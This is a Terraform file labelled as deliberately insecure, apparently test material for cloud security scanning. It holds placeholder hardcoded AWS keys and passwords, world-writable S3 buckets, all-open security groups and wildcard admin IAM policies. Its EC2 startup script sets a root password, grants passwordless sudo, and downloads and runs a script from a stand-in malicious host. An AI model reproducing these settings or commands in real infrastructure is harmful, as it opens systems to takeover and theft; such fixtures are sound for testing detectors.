# Vulnerable Terraform configuration with security issues
terraform {
  required_version = ">= 0.12"  # Using older version
}

# Provider without version pinning
provider "aws" {
  region     = "us-west-2"
  access_key = "AKIA1234567890ABCDEF"          # Hardcoded access key
  secret_key = "abcdefghijklmnopqrstuvwxyz123"  # Hardcoded secret key
}

# Insecure S3 bucket
resource "aws_s3_bucket" "vulnerable_bucket" {
  bucket = "my-public-bucket-12345"  # Predictable name
  acl    = "public-read"             # Public access

  # No encryption
  # No versioning
  # No logging
}

# Public bucket policy
resource "aws_s3_bucket_policy" "vulnerable_bucket_policy" {
  bucket = aws_s3_bucket.vulnerable_bucket.id

  policy = jsonencode({
    Statement = [
      {
        Effect = "Allow"
        Principal = "*"                    # Allow everyone
        Action = [
          "s3:GetObject",
          "s3:PutObject",
          "s3:DeleteObject"               # Dangerous permissions
        ]
        Resource = "${aws_s3_bucket.vulnerable_bucket.arn}/*"
      }
    ]
  })
}

# Insecure VPC configuration
resource "aws_vpc" "vulnerable_vpc" {
  cidr_block           = "0.0.0.0/0"  # Too broad CIDR
  enable_dns_hostnames = true
  enable_dns_support   = true
}

# Public subnet with auto-assign public IP
resource "aws_subnet" "public_subnet" {
  vpc_id                  = aws_vpc.vulnerable_vpc.id
  cidr_block              = "10.0.1.0/24"
  availability_zone       = "us-west-2a"
  map_public_ip_on_launch = true  # Auto-assign public IPs

  tags = {
    Name = "public-subnet"
  }
}

# Internet Gateway (unnecessary exposure)
resource "aws_internet_gateway" "vulnerable_igw" {
  vpc_id = aws_vpc.vulnerable_vpc.id
}

# Overly permissive security group
resource "aws_security_group" "vulnerable_sg" {
  name        = "vulnerable-sg"
  description = "Vulnerable security group"
  vpc_id      = aws_vpc.vulnerable_vpc.id

  # Allow all traffic from anywhere
  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # Open to the world
  }

  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "udp"
    cidr_blocks = ["0.0.0.0/0"]  # Open to the world
  }

  # Allow all outbound traffic
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# EC2 instance with security issues
resource "aws_instance" "vulnerable_instance" {
  ami                    = "ami-12345"  # Hardcoded AMI
  instance_type          = "t2.micro"
  key_name              = "my-key"
  vpc_security_group_ids = [aws_security_group.vulnerable_sg.id]
  subnet_id             = aws_subnet.public_subnet.id

  # Hardcoded user data with secrets
  user_data = <<-EOF
              #!/bin/bash
              echo "root:password123" | chpasswd
              echo "admin ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
              curl -o /tmp/setup.sh http://malicious-site.com/setup.sh
              chmod +x /tmp/setup.sh
              /tmp/setup.sh
              EOF

  # No encryption
  root_block_device {
    encrypted = false
  }

  tags = {
    Name = "vulnerable-instance"
  }
}

# RDS instance with security issues
resource "aws_rds_instance" "vulnerable_db" {
  identifier     = "vulnerable-db"
  engine         = "mysql"
  engine_version = "5.7"  # Outdated version
  instance_class = "db.t2.micro"
  
  db_name  = "myapp"
  username = "admin"
  password = "password123"  # Hardcoded password

  allocated_storage = 20
  storage_encrypted = false  # No encryption

  publicly_accessible = true  # Public access
  skip_final_snapshot = true
  
  vpc_security_group_ids = [aws_security_group.vulnerable_sg.id]

  # No backup retention
  backup_retention_period = 0
  backup_window          = ""
}

# IAM role with excessive permissions
resource "aws_iam_role" "vulnerable_role" {
  name = "vulnerable-role"

  assume_role_policy = jsonencode({
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "*"  # Any service can assume this role
        }
      }
    ]
  })
}

# IAM policy with admin access
resource "aws_iam_policy" "vulnerable_policy" {
  name = "vulnerable-policy"

  policy = jsonencode({
    Statement = [
      {
        Effect   = "Allow"
        Action   = "*"        # Full admin access
        Resource = "*"        # To all resources
      }
    ]
  })
}

# Attach the overly permissive policy
resource "aws_iam_role_policy_attachment" "vulnerable_attachment" {
  role       = aws_iam_role.vulnerable_role.name
  policy_arn = aws_iam_policy.vulnerable_policy.arn
}

# Lambda function with security issues
resource "aws_lambda_function" "vulnerable_lambda" {
  filename         = "vulnerable_function.zip"
  function_name    = "vulnerable-function"
  role            = aws_iam_role.vulnerable_role.arn
  handler         = "index.handler"
  runtime         = "python2.7"  # Deprecated runtime

  environment {
    variables = {
      DB_PASSWORD = "password123"        # Hardcoded password
      API_KEY     = "sk-1234567890"     # Hardcoded API key
      DEBUG       = "true"              # Debug enabled
    }
  }

  # No VPC configuration (runs in default VPC)
  # No dead letter queue
  # No reserved concurrency limits
}

# CloudTrail with issues
resource "aws_cloudtrail" "vulnerable_trail" {
  name           = "vulnerable-trail"
  s3_bucket_name = aws_s3_bucket.vulnerable_bucket.bucket

  # No encryption
  # No log file validation
  # No SNS topic for notifications

  event_selector {
    read_write_type                 = "All"
    include_management_events       = true
    exclude_management_event_sources = []

    data_resource {
      type   = "AWS::S3::Object"
      values = ["*"]  # All S3 objects
    }
  }
}